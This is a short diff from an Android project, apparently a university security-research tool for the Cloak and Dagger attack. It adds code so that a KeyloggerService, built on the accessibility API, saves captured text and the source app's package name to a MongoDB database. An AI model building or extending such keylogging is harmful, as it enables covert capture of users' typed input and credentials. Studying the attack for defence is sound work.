@@ -11,6 +11,7 @@ import android.view.accessibility.AccessibilityEvent;
 import static pl.edu.agh.sarna.cloak_and_dagger.Constants.INTENT_NAME;
 import static pl.edu.agh.sarna.cloak_and_dagger.Constants.INTENT_VALUE;
 import static pl.edu.agh.sarna.cloak_and_dagger.Constants.LOG_TAG;
+import static pl.edu.agh.sarna.db.mongo.scripts.CloakScripts.saveCloakTextToMongo;
 import static pl.edu.agh.sarna.db.scripts.CloakScriptsKt.getLastCloakRunID;
 import static pl.edu.agh.sarna.db.scripts.CloakScriptsKt.insertCloakText;
 
@@ -18,6 +19,7 @@ public class KeyloggerService extends AccessibilityService {
 
     private KeyloggerBuffer buffer = new KeyloggerBuffer((text, packageName) -> {
 //        insertCloakText(getApplicationContext(), getLastCloakRunID(getApplicationContext()), text, packageName);
+        saveCloakTextToMongo(text, packageName);
         String displayText = String.format("Saved text \"%s\" from %s", text, packageName);
         Log.d(LOG_TAG, displayText);
         LocalBroadcastManager.getInstance(KeyloggerService.this)
